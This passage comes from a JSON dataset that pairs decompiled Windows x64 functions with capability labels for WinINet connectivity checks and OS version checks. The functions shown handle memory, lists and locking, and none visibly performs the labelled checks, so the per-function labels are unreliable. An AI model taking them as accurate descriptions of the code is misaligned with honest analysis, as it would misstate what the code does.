        "decompiled_code": "\nulong fcn.14000a9c0(ulong noname_0, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg2 != 2) {\n        if (arg2 < 3) {\n            if (arg2 == 0) {\n                if (*0x1400edfc8 != 0) {\n                    fcn.14000a840();\n                }\n                iVar2 = *0x1400edfc0;\n                if (*0x1400edfc8 == 1) {\n                    while (iVar2 != 0) {\n                        iVar1 = *(iVar2 + 0x10);\n                        sub.msvcrt.dll_free(iVar2);\n                        iVar2 = iVar1;\n                    }\n                    *0x1400edfc0 = 0;\n                    *0x1400edfc8 = 0;\n                    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x1400edfe0);\n                }\n            }\n            else {\n                if (*0x1400edfc8 == 0) {\n                    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x1400edfe0);\n                }\n                *0x1400edfc8 = 1;\n            }\n        }\n        else if ((arg2 == 3) && (*0x1400edfc8 != 0)) {\n            fcn.14000a840();\n        }\n        return 1;\n    }\n    fcn.14000a1b0();\n    return 1;\n}\n",
        "token_count": 332
    },
    "14000aef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000aef0(uint64_t arg1)\n\n{\n    int64_t **ppiVar1;\n    uint64_t *puVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    \n    piVar4 = *0x1400d7110;\n    iVar6 = **0x1400d7110;\n    if (iVar6 == 0) {\n        iVar5 = fcn.1400113f0();\n        iVar6 = *piVar4;\n        if (*(iVar5 + 0x70) == 0) goto code_r0x00014000af20;\n        if (iVar6 != 0) goto code_r0x00014000b010;\n        iVar6 = fcn.1400113f0();\n        if (**(iVar6 + 0x70) == 0) {\n            return 0;\n        }\n        iVar6 = *piVar4;\n        if (iVar6 != 0) goto code_r0x00014000af3c;\n        iVar5 = fcn.1400113f0();\n        iVar6 = *piVar4;\n        if (*(iVar5 + 0x70) == 0) goto code_r0x00014000af47;\n        if (iVar6 != 0) goto code_r0x00014000b020;\n        iVar6 = fcn.1400113f0();\n        if (**(iVar6 + 0x70) != 1) {\n            iVar6 = *piVar4;\n            if (iVar6 != 0) goto code_r0x00014000af5c;\n            iVar5 = fcn.1400113f0();\n            iVar6 = *piVar4;\n            if (*(iVar5 + 0x70) == 0) goto code_r0x00014000b0f0;\n            if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n            }\n            goto code_r0x00014000af67;\n        }\n        iVar6 = *piVar4;\n        if (iVar6 != 0) goto code_r0x00014000b02e;\n        iVar5 = fcn.1400113f0();\n        iVar6 = *piVar4;\n        if (*(iVar5 + 0x68) == 0) goto code_r0x00014000b200;\n        if (iVar6 != 0) goto code_r0x00014000b039;\n        iVar6 = fcn.1400113f0();\n        if (*(**(iVar6 + 0x68) + 8) != arg1) {\n            return 0;\n        }\n        iVar6 = *piVar4;\n        if (iVar6 == 0) {\n            iVar5 = fcn.1400113f0();\n            iVar6 = *piVar4;\n            iVar5 = *(iVar5 + 0x68);\n            goto joined_r0x00014000b26d;\n        }\n    }\n    else {\n        if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000af20:\n            *(iVar6 + 0x70) = 0x1400ee070;\n            piVar3 = 0x1400ee070;\n        }\n        else {\ncode_r0x00014000b010:\n            piVar3 = *(iVar6 + 0x70);\n        }\n        if (*piVar3 == 0) {\n            return 0;\n        }\n        iVar6 = *piVar4;\ncode_r0x00014000af3c:\n        if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000af47:\n            iVar5 = *0x1400ee070;\n            *(iVar6 + 0x70) = 0x1400ee070;\n        }\n        else {\ncode_r0x00014000b020:\n            iVar5 = **(iVar6 + 0x70);\n        }\n        if (iVar5 != 1) {\ncode_r0x00014000af5c:\n            if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000b0f0:\n                piVar3 = 0x1400ee070;\n                *(iVar6 + 0x70) = 0x1400ee070;\n                goto code_r0x00014000af6f;\n            }\ncode_r0x00014000af67:\n            piVar3 = *(iVar6 + 0x70);\n            iVar6 = *piVar4;\ncode_r0x00014000af6f:\n            uVar10 = 0;\n            uVar9 = *piVar3 - 1;\n            do {\n                uVar8 = uVar10 + uVar9 >> 1;\n                if (iVar6 == 0) {\n                    iVar5 = fcn.1400113f0();\n                    iVar6 = *piVar4;\n                    if (*(iVar5 + 0x68) == 0) goto code_r0x00014000b070;\n                    if (iVar6 != 0) goto code_r0x00014000afb5;\n                    iVar6 = fcn.1400113f0();\n                    piVar3 = *(iVar6 + 0x68);\n                    iVar6 = *piVar4;\ncode_r0x00014000b077:\n                    if (*(*piVar3 + 8 + uVar8 * 0x10) == arg1) {\ncode_r0x00014000b100:\n                        if (iVar6 == 0) {\n                            iVar5 = fcn.1400113f0();\n                            iVar6 = *piVar4;\n                            if (*(iVar5 + 0x68) != 0) {\n                                if (iVar6 == 0) {\n                                    iVar6 = fcn.1400113f0();\n                                }\n                                goto code_r0x00014000b150;\n                            }\n                        }\n                        else if (*(iVar6 + 0x68) != 0) {\ncode_r0x00014000b150:\n                            piVar4 = *(iVar6 + 0x68);\n                            goto code_r0x00014000b11a;\n                        }\n                        *(iVar6 + 0x68) = 0x1400ee078;\n                        piVar4 = 0x1400ee078;\ncode_r0x00014000b11a:\n                        return *(*piVar4 + uVar8 * 0x10);\n                    }\n                    if (iVar6 != 0) goto code_r0x00014000afd2;\n                    iVar5 = fcn.1400113f0();\n                    iVar6 = *piVar4;\n                    if (*(iVar5 + 0x68) != 0) {\n                        if (iVar6 == 0) {\n                            iVar6 = fcn.1400113f0();\n                        }\n                        goto code_r0x00014000afdd;\n                    }\ncode_r0x00014000b0b8:\n                    *(iVar6 + 0x68) = 0x1400ee078;\n                    piVar3 = 0x1400ee078;\n                }\n                else {\n                    if (*(iVar6 + 0x68) == 0) {\ncode_r0x00014000b070:\n                        *(iVar6 + 0x68) = 0x1400ee078;\n                        piVar3 = 0x1400ee078;\n                        goto code_r0x00014000b077;\n                    }\ncode_r0x00014000afb5:\n                    ppiVar1 = iVar6 + 0x68;\n                    iVar6 = *piVar4;\n                    if (*(**ppiVar1 + 8 + uVar8 * 0x10) == arg1) goto code_r0x00014000b100;\ncode_r0x00014000afd2:\n                    if (*(iVar6 + 0x68) == 0) goto code_r0x00014000b0b8;\ncode_r0x00014000afdd:\n                    piVar3 = *(iVar6 + 0x68);\n                }\n                puVar2 = *piVar3 + 8 + uVar8 * 0x10;\n                if (*puVar2 < arg1 || *puVar2 == arg1) {\n                    uVar10 = uVar8 + 1;\n                    if (uVar9 < uVar10) {\n                        return 0;\n                    }\n                }\n                else {\n                    if (uVar8 == uVar10) {\n                        return 0;\n                    }\n                    uVar9 = uVar8 - 1;\n                    if (uVar9 < uVar10) {\n                        return 0;\n                    }\n                }\n                iVar6 = *piVar4;\n            } while( true );\n        }\ncode_r0x00014000b02e:\n        if (*(iVar6 + 0x68) == 0) {\ncode_r0x00014000b200:\n            piVar4 = 0x1400ee078;\n            *(iVar6 + 0x68) = 0x1400ee078;\n        }\n        else {\ncode_r0x00014000b039:\n            piVar4 = *(iVar6 + 0x68);\n        }\n        if (arg1 != *(*piVar4 + 8)) {\n            return 0;\n        }\n    }\n    iVar5 = *(iVar6 + 0x68);\njoined_r0x00014000b26d:\n    if (iVar5 == 0) {\n        *(iVar6 + 0x68) = 0x1400ee078;\n        puVar7 = 0x1400ee078;\n    }\n    else {\n        if (iVar6 == 0) {\n            iVar6 = fcn.1400113f0();\n        }\n        puVar7 = *(iVar6 + 0x68);\n    }\n    return **puVar7;\n}\n",
        "token_count": 2202
    },
    "14000b29": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14000b290(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t **ppiVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    ulong uVar6;\n    int64_t *piVar7;\n    \n    piVar1 = *0x1400d7110;\n    iVar4 = **0x1400d7110;\n    if (iVar4 == 0) {\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0x90) != 0) {\n            if (iVar4 == 0) {\n                iVar4 = fcn.1400113f0();\n            }\n            goto code_r0x00014000b3e0;\n        }\ncode_r0x00014000b2bc:\n        uVar6 = 0x14001b0b0;\n        *(iVar4 + 0x90) = 0x14001b0b0;\n    }\n    else {\n        if (*(iVar4 + 0x90) == 0) goto code_r0x00014000b2bc;\ncode_r0x00014000b3e0:\n        uVar6 = *(iVar4 + 0x90);\n    }\n    fcn.1400132a0(uVar6);\n    iVar4 = *piVar1;\n    if (iVar4 == 0) {\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0x88) != 0) {\n            if (iVar4 == 0) {\n                iVar4 = fcn.1400113f0();\n            }\n            goto code_r0x00014000b3b0;\n        }\ncode_r0x00014000b2e9:\n        *(iVar4 + 0x88) = 0x1400ee058;\n        ppiVar2 = 0x1400ee058;\n    }\n    else {\n        if (*(iVar4 + 0x88) == 0) goto code_r0x00014000b2e9;\ncode_r0x00014000b3b0:\n        ppiVar2 = *(iVar4 + 0x88);\n    }\n    piVar5 = *ppiVar2;\n    if (*ppiVar2 != NULL) {\n        do {\n            piVar7 = piVar5;\n            if (*piVar7 == arg1) {\n                *(piVar7 + 2) = *(piVar7 + 2) + 1;\n                goto code_r0x00014000b32d;\n            }\n            piVar5 = piVar7[3];\n        } while (piVar7[3] != NULL);\n        piVar5 = sub.msvcrt.dll_calloc(1);\n        *piVar5 = arg1;\n        *(piVar5 + 2) = 1;\n        piVar7[3] = piVar5;\n        goto code_r0x00014000b419;\n    }\n    piVar5 = sub.msvcrt.dll_calloc(1);\n    *piVar5 = arg1;\n    *(piVar5 + 2) = 1;\n    iVar4 = *piVar1;\n    if (iVar4 == 0) {\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0x88) == 0) goto code_r0x00014000b485;\n        if (iVar4 == 0) {\n            iVar4 = fcn.1400113f0();\n        }\ncode_r0x00014000b458:\n        ppiVar2 = *(iVar4 + 0x88);\n    }\n    else {\n        if (*(iVar4 + 0x88) != 0) goto code_r0x00014000b458;\ncode_r0x00014000b485:\n        *(iVar4 + 0x88) = 0x1400ee058;\n        ppiVar2 = 0x1400ee058;\n    }\n    *ppiVar2 = piVar5;\ncode_r0x00014000b419:\n    fcn.140011ec0(piVar5 + 1, 0);\n    piVar7 = piVar5;\ncode_r0x00014000b32d:\n    iVar4 = *piVar1;\n    if (iVar4 == 0) {\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar1;\n        iVar3 = *(iVar3 + 0x90);\n    }\n    else {\n        iVar3 = *(iVar4 + 0x90);\n    }\n    if (iVar3 == 0) {\n        uVar6 = 0x14001b0b0;\n        *(iVar4 + 0x90) = 0x14001b0b0;\n    }\n    else {\n        if (iVar4 == 0) {\n            iVar4 = fcn.1400113f0();\n        }\n        uVar6 = *(iVar4 + 0x90);\n    }\n    fcn.1400132e0(uVar6);\n    return piVar7;\n}\n",
        "token_count": 1158
    },
    "14000b4a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000b4a0(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    ulong in_RAX;\n    int64_t *piVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    \n    piVar2 = *0x1400d7110;\n    if (arg1 == 0) {\n        return in_RAX;\n    }\n    iVar6 = **0x1400d7110;\n    if (iVar6 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar2;\n        if (*(iVar4 + 0x90) == 0) goto code_r0x00014000b4d5;\n        if (iVar6 == 0) {\n            iVar6 = fcn.1400113f0();\n        }\ncode_r0x00014000b5b0:\n        fcn.1400132a0(*(iVar6 + 0x90));\n        iVar6 = *piVar2;\n        if (iVar6 != 0) goto code_r0x00014000b4f4;\ncode_r0x00014000b5c8:\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar2;\n        if (*(iVar4 + 0x88) != 0) {\n            if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n            }\n            goto code_r0x00014000b502;\n        }\ncode_r0x00014000b5f0:\n        *(iVar6 + 0x88) = 0x1400ee058;\n        piVar3 = 0x1400ee058;\n    }\n    else {\n        if (*(iVar6 + 0x90) != 0) goto code_r0x00014000b5b0;\ncode_r0x00014000b4d5:\n        *(iVar6 + 0x90) = 0x14001b0b0;\n        fcn.1400132a0(0x14001b0b0);\n        iVar6 = *piVar2;\n        if (iVar6 == 0) goto code_r0x00014000b5c8;\ncode_r0x00014000b4f4:\n        if (*(iVar6 + 0x88) == 0) goto code_r0x00014000b5f0;\ncode_r0x00014000b502:\n        piVar3 = *(iVar6 + 0x88);\n    }\n    iVar6 = *piVar3;\n    if ((arg1 == iVar6) || (iVar6 == 0)) {\n        iVar4 = 0;\n    }\n    else {\n        do {\n            iVar4 = iVar6;\n            iVar6 = *(iVar4 + 0x18);\n            if (iVar6 == 0) goto code_r0x00014000b6b0;\n        } while (arg1 != iVar6);\n    }\n    if (iVar6 == 0) {\ncode_r0x00014000b6b0:\n        uVar5 = (**0x14001b130)(2);\n        sub.msvcrt.dll_fprintf(uVar5, \"%p not found?!?!\\n\", arg1);\n        goto code_r0x00014000b54a;\n    }\n    piVar1 = arg1 + 0x10;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 != 0) goto code_r0x00014000b54a;\n    fcn.140011f10(arg1 + 8);\n    if (iVar4 == 0) {\n        iVar6 = *piVar2;\n        if (iVar6 == 0) {\n            iVar4 = fcn.1400113f0();\n            iVar6 = *piVar2;\n            if (*(iVar4 + 0x88) == 0) goto code_r0x00014000b683;\n            if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n            }\ncode_r0x00014000b708:\n            puVar7 = *(iVar6 + 0x88);\n        }\n        else {\n            if (*(iVar6 + 0x88) != 0) goto code_r0x00014000b708;\ncode_r0x00014000b683:\n            *(iVar6 + 0x88) = 0x1400ee058;\n            puVar7 = 0x1400ee058;\n        }\n        *puVar7 = *(arg1 + 0x18);\n    }\n    else {\n        *(iVar4 + 0x18) = *(arg1 + 0x18);\n    }\n    sub.msvcrt.dll_free(arg1);\ncode_r0x00014000b54a:\n    iVar6 = *piVar2;\n    if (iVar6 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar2;\n        iVar4 = *(iVar4 + 0x90);\n    }\n    else {\n        iVar4 = *(iVar6 + 0x90);\n    }\n    if (iVar4 == 0) {\n        puVar7 = 0x14001b0b0;\n        *(iVar6 + 0x90) = 0x14001b0b0;\n    }\n    else {\n        if (iVar6 == 0) {\n            iVar6 = fcn.1400113f0();\n        }\n        puVar7 = *(iVar6 + 0x90);\n    }\n    *puVar7 = 0xffffffffffffffff;\n    return 0;\n}\n",
        "token_count": 1267
    },
    "14000b74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000b740(int64_t arg1)\n\n{\n    int64_t **ppiVar1;\n    uint64_t **ppuVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    uint64_t *puVar8;\n    ulong *puVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    \n    piVar6 = *0x1400d7110;\n    if (arg1 == 0) {\n        return 0;\n    }\n    iVar3 = **0x1400d7110;\n    if (iVar3 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (*(iVar4 + 0x70) == 0) goto code_r0x00014000b778;\n        if (iVar3 != 0) goto code_r0x00014000b868;\n        iVar3 = fcn.1400113f0();\n        uVar10 = **(iVar3 + 0x70);\n        iVar3 = *piVar6;\n        if (iVar3 != 0) goto code_r0x00014000b786;\n        iVar4 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (*(iVar4 + 0x78) == 0) goto code_r0x00014000bc9a;\n        if (iVar3 != 0) goto code_r0x00014000b791;\n        iVar4 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (uVar10 < **(iVar4 + 0x78)) goto code_r0x00014000b81f;\n        if (iVar3 != 0) goto code_r0x00014000bcae;\n        iVar4 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (*(iVar4 + 0x70) == 0) goto code_r0x00014000bcb9;\n        if (iVar3 != 0) goto code_r0x00014000bdb3;\n        iVar3 = fcn.1400113f0();\n        if (**(iVar3 + 0x70) != 0) {\n            iVar3 = *piVar6;\n            if (iVar3 != 0) goto code_r0x00014000bcd4;\n            iVar4 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            if (*(iVar4 + 0x78) == 0) goto code_r0x00014000bcdf;\n            if (iVar3 != 0) goto code_r0x00014000be27;\n            iVar4 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            iVar4 = (**(iVar4 + 0x78) + 0x10) * 0x10;\n            if (iVar3 != 0) goto code_r0x00014000bcf5;\n            iVar11 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            if (*(iVar11 + 0x68) == 0) goto code_r0x00014000c0b6;\n            if (iVar3 == 0) {\n                iVar3 = fcn.1400113f0();\n            }\n            goto code_r0x00014000bd00;\n        }\ncode_r0x00014000bdc1:\n        iVar4 = sub.msvcrt.dll_malloc(0x100);\n        if (iVar4 == 0) {\n            return 0;\n        }\n        iVar3 = *piVar6;\n        if (iVar3 == 0) {\n            iVar11 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            if (*(iVar11 + 0x78) != 0) {\n                if (iVar3 == 0) {\n                    iVar3 = fcn.1400113f0();\n                }\ncode_r0x00014000bdee:\n                puVar9 = iVar3 + 0x78;\n                iVar3 = *piVar6;\n                **puVar9 = 0x10;\n                goto joined_r0x00014000bdff;\n            }\n        }\n        else if (*(iVar3 + 0x78) != 0) goto code_r0x00014000bdee;\n        *0x1400ee068 = 0x10;\n        *(iVar3 + 0x78) = 0x1400ee068;\n        goto code_r0x00014000bd46;\n    }\n    if (*(iVar3 + 0x70) == 0) {\ncode_r0x00014000b778:\n        puVar8 = 0x1400ee070;\n        *(iVar3 + 0x70) = 0x1400ee070;\n    }\n    else {\ncode_r0x00014000b868:\n        puVar8 = *(iVar3 + 0x70);\n        iVar3 = *piVar6;\n    }\n    uVar10 = *puVar8;\ncode_r0x00014000b786:\n    if (*(iVar3 + 0x78) == 0) {\ncode_r0x00014000bc9a:\n        *(iVar3 + 0x78) = 0x1400ee068;\n        if (uVar10 < *0x1400ee068) goto code_r0x00014000b81f;\n    }\n    else {\ncode_r0x00014000b791:\n        if (uVar10 <= **(iVar3 + 0x78) && **(iVar3 + 0x78) != uVar10) goto code_r0x00014000b81f;\n    }\ncode_r0x00014000bcae:\n    if (*(iVar3 + 0x70) == 0) {\ncode_r0x00014000bcb9:\n        *(iVar3 + 0x70) = 0x1400ee070;\n        iVar3 = *0x1400ee070;\n    }\n    else {\ncode_r0x00014000bdb3:\n        iVar3 = **(iVar3 + 0x70);\n    }\n    if (iVar3 == 0) goto code_r0x00014000bdc1;\n    iVar3 = *piVar6;\ncode_r0x00014000bcd4:\n    if (*(iVar3 + 0x78) == 0) {\ncode_r0x00014000bcdf:\n        piVar5 = 0x1400ee068;\n        *(iVar3 + 0x78) = 0x1400ee068;\n    }\n    else {\ncode_r0x00014000be27:\n        piVar5 = *(iVar3 + 0x78);\n    }\n    iVar4 = (*piVar5 + 0x10) * 0x10;\ncode_r0x00014000bcf5:\n    if (*(iVar3 + 0x68) == 0) {\ncode_r0x00014000c0b6:\n        *(iVar3 + 0x68) = 0x1400ee078;\n        puVar9 = 0x1400ee078;\n    }\n    else {\ncode_r0x00014000bd00:\n        puVar9 = *(iVar3 + 0x68);\n    }\n    iVar4 = sub.msvcrt.dll_realloc(*puVar9, iVar4);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    iVar3 = *piVar6;\n    if (iVar3 == 0) {\n        iVar11 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x78) != 0) {\n            if (iVar3 == 0) {\n                iVar3 = fcn.1400113f0();\n            }\n            goto code_r0x00014000bd32;\n        }\ncode_r0x00014000c09e:\n        *0x1400ee068 = *0x1400ee068 + 0x10;\n        *(iVar3 + 0x78) = 0x1400ee068;\ncode_r0x00014000bd46:\n        if (*(iVar3 + 0x68) == 0) goto code_r0x00014000be57;\ncode_r0x00014000bd51:\n        piVar5 = *(iVar3 + 0x68);\n        iVar3 = *piVar6;\n    }\n    else {\n        if (*(iVar3 + 0x78) == 0) goto code_r0x00014000c09e;\ncode_r0x00014000bd32:\n        ppiVar1 = iVar3 + 0x78;\n        iVar3 = *piVar6;\n        **ppiVar1 = **ppiVar1 + 0x10;\njoined_r0x00014000bdff:\n        if (iVar3 != 0) goto code_r0x00014000bd46;\n        iVar11 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x68) != 0) {\n            if (iVar3 == 0) {\n                iVar3 = fcn.1400113f0();\n            }\n            goto code_r0x00014000bd51;\n        }\ncode_r0x00014000be57:\n        piVar5 = 0x1400ee078;\n        *(iVar3 + 0x68) = 0x1400ee078;\n    }\n    *piVar5 = iVar4;\ncode_r0x00014000b81f:\n    if (iVar3 == 0) goto code_r0x00014000b8c8;\ncode_r0x00014000b828:\n    if (*(iVar3 + 0x80) != 0) goto code_r0x00014000b7b0;\ncode_r0x00014000b836:\n    *0x1400ee060 = *0x1400ee060 + 1;\n    *(iVar3 + 0x80) = 0x1400ee060;\n    if (*(iVar3 + 0x80) != 0) goto code_r0x00014000b7d1;\ncode_r0x00014000b84f:\n    *(iVar3 + 0x80) = 0x1400ee060;\n    if ((*0x1400ee060 & 0x4000000000000000) == 0) goto code_r0x00014000b805;\ncode_r0x00014000b85f:\n    puVar9 = *(iVar3 + 0x80);\ncode_r0x00014000b7f5:\n    do {\n        *puVar9 = 1;\ncode_r0x00014000b7fc:\n        do {\n            if (iVar3 == 0) {\n                iVar4 = fcn.1400113f0();\n                iVar3 = *piVar6;\n                if (*(iVar4 + 0x80) != 0) {\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.1400113f0();\n                    }\n                    goto code_r0x00014000b80f;\n                }\ncode_r0x00014000b878:\n                *(iVar3 + 0x80) = 0x1400ee060;\n                uVar10 = *0x1400ee060;\n            }\n            else {\ncode_r0x00014000b805:\n                if (*(iVar3 + 0x80) == 0) goto code_r0x00014000b878;\ncode_r0x00014000b80f:\n                ppuVar2 = iVar3 + 0x80;\n                iVar3 = *piVar6;\n                uVar10 = **ppuVar2;\n            }\n            if (uVar10 == 0) goto code_r0x00014000b81f;\n            if (iVar3 == 0) {\n                iVar4 = fcn.1400113f0();\n                iVar3 = *piVar6;\n                if (*(iVar4 + 0x80) != 0) {\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.1400113f0();\n                    }\n                    goto code_r0x00014000b89f;\n                }\ncode_r0x00014000b9a0:\n                *(iVar3 + 0x80) = 0x1400ee060;\n                iVar3 = fcn.14000aef0(*0x1400ee060);\n            }\n            else {\n                if (*(iVar3 + 0x80) == 0) goto code_r0x00014000b9a0;\ncode_r0x00014000b89f:\n                iVar3 = fcn.14000aef0(**(iVar3 + 0x80));\n            }\n            if (iVar3 == 0) {\n                iVar3 = *piVar6;\n                if (iVar3 == 0) {\n                    iVar4 = fcn.1400113f0();\n                    iVar3 = *piVar6;\n                    if (*(iVar4 + 0x70) != 0) {\n                        if (iVar3 != 0) goto code_r0x00014000b9d2;\n                        iVar4 = fcn.1400113f0();\n                        iVar3 = *piVar6;\n                        piVar5 = *(iVar4 + 0x70);\n                        goto code_r0x00014000b9d9;\n                    }\ncode_r0x00014000bd60:\n                    iVar4 = *0x1400ee070;\n                    *(iVar3 + 0x70) = 0x1400ee070;\n                    if (iVar4 == 0) goto code_r0x00014000bbfe;\n                }\n                else {\n                    if (*(iVar3 + 0x70) == 0) goto code_r0x00014000bd60;\ncode_r0x00014000b9d2:\n                    piVar5 = *(iVar3 + 0x70);\n                    iVar3 = *piVar6;\ncode_r0x00014000b9d9:\n                    iVar4 = *piVar5;\n                    if (iVar4 == 0) goto code_r0x00014000bbf5;\n                }\n                iVar11 = iVar4 << 4;\n                goto code_r0x00014000ba38;\n            }\n            iVar3 = *piVar6;\n            if (iVar3 != 0) goto code_r0x00014000b828;\ncode_r0x00014000b8c8:\n            iVar4 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            if (*(iVar4 + 0x80) == 0) goto code_r0x00014000b836;\n            if (iVar3 == 0) {\n                iVar3 = fcn.1400113f0();\n            }\ncode_r0x00014000b7b0:\n            ppiVar1 = iVar3 + 0x80;\n            iVar3 = *piVar6;\n            **ppiVar1 = **ppiVar1 + 1;\n            if (iVar3 == 0) {\n                iVar4 = fcn.1400113f0();\n                iVar3 = *piVar6;\n                if (*(iVar4 + 0x80) == 0) goto code_r0x00014000b84f;\n                if (iVar3 == 0) {\n                    iVar4 = fcn.1400113f0();\n                    iVar3 = *piVar6;\n                    if ((*(*(iVar4 + 0x80) + 7) & 0x40) != 0) {\n                        if (iVar3 == 0) {\n                            iVar4 = fcn.1400113f0();\n                            iVar3 = *piVar6;\n                            if (*(iVar4 + 0x80) == 0) goto code_r0x00014000b7eb;\n                            if (iVar3 != 0) goto code_r0x00014000b85f;\n                            iVar3 = fcn.1400113f0();\n                            puVar9 = *(iVar3 + 0x80);\n                            iVar3 = *piVar6;\n                            goto code_r0x00014000b7f5;\n                        }\n                        break;\n                    }\n                    goto code_r0x00014000b7fc;\n                }\n            }\n            else if (*(iVar3 + 0x80) == 0) goto code_r0x00014000b84f;\ncode_r0x00014000b7d1:\n            piVar5 = iVar3 + 0x80;\n            iVar3 = *piVar6;\n        } while ((*(*piVar5 + 7) & 0x40) == 0);\n        if (*(iVar3 + 0x80) != 0) goto code_r0x00014000b85f;\ncode_r0x00014000b7eb:\n        *(iVar3 + 0x80) = 0x1400ee060;\n        puVar9 = 0x1400ee060;\n    } while( true );\ncode_r0x00014000ba38:\n    do {\n        iVar11 = iVar11 + -0x10;\n        if (iVar3 == 0) {\n            iVar3 = fcn.1400113f0();\n            if (*(iVar3 + 0x68) != 0) goto code_r0x00014000ba00;\n            iVar3 = *piVar6;\n            piVar5 = 0x1400ee078;\n            *(iVar3 + 0x68) = 0x1400ee078;\ncode_r0x00014000ba10:\n            uVar10 = *(*piVar5 + 8 + iVar11);\ncode_r0x00014000ba18:\n            if (*(iVar3 + 0x80) != 0) {\ncode_r0x00014000ba22:\n                puVar8 = *(iVar3 + 0x80);\n                goto code_r0x00014000ba29;\n            }\ncode_r0x00014000ba88:\n            *(iVar3 + 0x80) = 0x1400ee060;\n            if (uVar10 <= *0x1400ee060) break;\n        }\n        else {\n            if (*(iVar3 + 0x68) == 0) {\n                *(iVar3 + 0x68) = 0x1400ee078;\n                piVar5 = 0x1400ee078;\n                goto code_r0x00014000ba10;\n            }\ncode_r0x00014000ba00:\n            iVar3 = *piVar6;\n            if (iVar3 != 0) {\n                piVar5 = *(iVar3 + 0x68);\n                goto code_r0x00014000ba10;\n            }\n            iVar12 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            uVar10 = *(**(iVar12 + 0x68) + 8 + iVar11);\n            if (iVar3 != 0) goto code_r0x00014000ba18;\n            iVar12 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            if (*(iVar12 + 0x80) == 0) goto code_r0x00014000ba88;\n            if (iVar3 != 0) goto code_r0x00014000ba22;\n            iVar12 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            puVar8 = *(iVar12 + 0x80);\ncode_r0x00014000ba29:\n            if (uVar10 <= *puVar8) break;\n        }\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    if (iVar3 == 0) {\n        iVar11 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x70) == 0) goto code_r0x00014000bb79;\n        if (iVar3 != 0) goto code_r0x00014000baab;\n        iVar11 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (iVar4 != **(iVar11 + 